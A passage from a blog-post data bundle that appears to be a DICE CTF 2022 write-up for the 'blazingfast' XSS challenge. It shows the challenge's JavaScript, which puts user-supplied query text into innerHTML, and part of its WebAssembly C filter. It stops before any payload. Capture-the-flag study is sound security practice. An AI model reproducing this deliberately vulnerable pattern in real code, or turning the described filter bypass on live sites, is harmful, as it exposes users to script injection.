{"pageProps":{"post":{"mdxSource":"var Component=(()=>{var r=Object.create;var t=Object.defineProperty;var p=Object.getOwnPropertyDescriptor;var d=Object.getOwnPropertyNames;var h=Object.getPrototypeOf,m=Object.prototype.hasOwnProperty;var l=a=>t(a,\"__esModule\",{value:!0});var u=(a,s)=>()=>(s||a((s={exports:{}}).exports,s),s.exports),N=(a,s)=>{l(a);for(var c in s)t(a,c,{get:s[c],enumerable:!0})},k=(a,s,c)=>{if(s&&typeof s==\"object\"||typeof s==\"function\")for(let e of d(s))!m.call(a,e)&&e!==\"default\"&&t(a,e,{get:()=>s[e],enumerable:!(c=p(s,e))||c.enumerable});return a},g=a=>k(l(t(a!=null?r(h(a)):{},\"default\",a&&a.__esModule&&\"default\"in a?{get:()=>a.default,enumerable:!0}:{value:a,enumerable:!0})),a);var o=u((x,i)=>{i.exports=_jsx_runtime});var y={};N(y,{default:()=>w,frontmatter:()=>f});var n=g(o()),f={title:\"DICE CTF 2022 \\u2013 blazingfast\",date:\"2022-02-06\",draft:!1,authors:[\"thebish0p\"],tags:[\"DICE CTF 2022\",\"Web\",\"XSS\",\"Unicode\"],summary:\"Bypassing length limitation with Unicode\"};function b(a={}){let{wrapper:s}=a.components||{};return s?(0,n.jsx)(s,Object.assign({},a,{children:(0,n.jsx)(c,{})})):c();function c(){let e=Object.assign({h2:\"h2\",a:\"a\",span:\"span\",blockquote:\"blockquote\",p:\"p\",img:\"img\",code:\"code\",pre:\"pre\",math:\"math\",semantics:\"semantics\",mrow:\"mrow\",mn:\"mn\",mi:\"mi\",mo:\"mo\",annotation:\"annotation\"},a.components);return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsxs)(e.h2,{id:\"blazingfast\",children:[(0,n.jsx)(e.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#blazingfast\",children:(0,n.jsx)(e.span,{className:\"icon icon-link\"})}),\"blazingfast\"]}),`\n`,(0,n.jsxs)(e.blockquote,{children:[`\n`,(0,n.jsx)(e.p,{children:\"by larry\"}),`\n`,(0,n.jsx)(e.p,{children:\"I made a blazing fast MoCkInG CaSe converter!\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:\"blazingfast.mc.ax\",children:\"blazingfast.mc.ax\"})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:\"https://admin-bot.mc.ax/blazingfast\",children:\"Admin Bot\"})}),`\n`,(0,n.jsx)(e.p,{children:\"Downloads\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:\"https://static.dicega.ng/uploads/c37db76fc7e66f32dee53b48652868aefd79193c1b5936e1f2441e3c70cfcdfa/blazingfast.tar\",children:\"blazingfast.tar\"})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:\"https://static.dicega.ng/uploads/1286aac5ffb57d27c1dc1e0221c7c3691e575181720449df62dff67d10ec6749/admin-bot.js\",children:\"admin-bot.js\"})}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.a,{href:\"https://static.dicega.ng/uploads/209c5168fc160763f28a23f23280f921c7e544fb87323726e48584b89d774825/blazingfast.c\",children:\"blazingfast.c\"})}),`\n`]}),`\n`,(0,n.jsx)(e.p,{children:\"We start by noticing that we have a challenge link and an admin bot link which means this challenge is an XSS challenge. We start with browsing the website and testing it\\u2019s normal behaviour as shown below:\"}),`\n`,(0,n.jsx)(e.p,{children:(0,n.jsx)(e.img,{src:\"/static/images/dice-ctf-2022/blazing-fast/website.png\",alt:\"website.png\"})}),`\n`,(0,n.jsxs)(e.p,{children:[\"Moving to the source code, we start by analyzing \",(0,n.jsx)(e.code,{children:\"index.html\"}),\":\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-javascript\",children:(0,n.jsxs)(e.code,{className:\"language-javascript code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"let\"}),\" blazingfast \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword null nil\",children:\"null\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"mock\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token parameter\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  blazingfast\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"init\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"length\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"length\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'Too long!'\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"for\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"let\"}),\" c \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"of\"}),\" str\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"toUpperCase\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"c\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"charCodeAt\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"128\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'Nice try.'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    blazingfast\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"c\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"charCodeAt\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"blazingfast\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"mock\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"return\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"'No XSS for you!'\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"else\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"let\"}),\" mocking \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token string\",children:\"''\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      buf \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" blazingfast\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"while\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"buf \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"!=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      mocking \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" \",(0,n.jsx)(e.span,{className:\"token known-class-name class-name\",children:\"String\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"fromCharCode\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"      buf \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" blazingfast\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"return\"}),` mocking\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"function\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"demo\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token parameter\",children:\"str\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token dom variable\",children:\"document\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"getElementById\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'result'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"innerHTML\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"mock\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"str\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token known-class-name class-name\",children:\"WebAssembly\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"instantiateStreaming\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token function\",children:\"fetch\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'/blazingfast.wasm'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"then\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsxs)(e.span,{className:\"token parameter\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),\" instance \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"})]}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  blazingfast \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" instance\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"exports\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token dom variable\",children:\"document\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"getElementById\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'demo-submit'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method-variable function-variable method function property-access\",children:\"onclick\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token arrow operator\",children:\"=>\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token function\",children:\"demo\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token dom variable\",children:\"document\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"getElementById\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'demo'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"value\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"let\"}),\" query \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"new\"}),\" \",(0,n.jsx)(e.span,{className:\"token class-name\",children:\"URLSearchParams\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token dom variable\",children:\"window\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"location\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"search\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"get\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'demo'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token keyword control-flow\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"query\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token dom variable\",children:\"document\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token method function property-access\",children:\"getElementById\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token string\",children:\"'demo'\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\".\"}),(0,n.jsx)(e.span,{className:\"token property-access\",children:\"value\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),` query\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"    \",(0,n.jsx)(e.span,{className:\"token function\",children:\"demo\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"query\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"  \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,n.jsxs)(e.p,{children:[\"As you can see, we can input data in the \",(0,n.jsx)(e.code,{children:\"demo\"}),\" parameter and the data provided will be processed by \",(0,n.jsx)(e.code,{children:\"blazingfast.mock()\"}),\" which is originating from the \",(0,n.jsx)(e.code,{children:\"blazingfast.c\"}),\" provided:\"]}),`\n`,(0,n.jsx)(e.pre,{className:\"language-c\",children:(0,n.jsxs)(e.code,{className:\"language-C code-highlight\",children:[(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" length\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\",\"}),\" ptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),(0,n.jsx)(e.span,{className:\"token number\",children:\"1000\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"init\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tlength \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" size\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tptr \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"read\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"return\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"void\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"write\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"char\"}),\" c\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\tbuf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"ptr\",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" c\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"}\"}),`\n`]}),(0,n.jsx)(e.span,{className:\"code-line\",children:`\n`}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" \",(0,n.jsx)(e.span,{className:\"token function\",children:\"mock\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"for\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),(0,n.jsx)(e.span,{className:\"token keyword\",children:\"int\"}),\" i \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"0\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" i \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<\"}),\" length\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\";\"}),\" i \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"++\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\",(0,n.jsx)(e.span,{className:\"token keyword\",children:\"if\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"(\"}),\"i \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"%\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"2\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"==\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"1\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&&\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\">=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"65\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"&&\"}),\" buf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"<=\"}),\" \",(0,n.jsx)(e.span,{className:\"token number\",children:\"90\"}),(0,n.jsx)(e.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"{\"}),`\n`]}),(0,n.jsxs)(e.span,{className:\"code-line\",children:[\"\t\t\tbuf\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"[\"}),\"i\",(0,n.jsx)(e.span,{className:\"token punctuation\",children:\"]\"}),\" \",(0,n.jsx)(e.span,{className:\"token operator\",children:\"+=\"}),\" 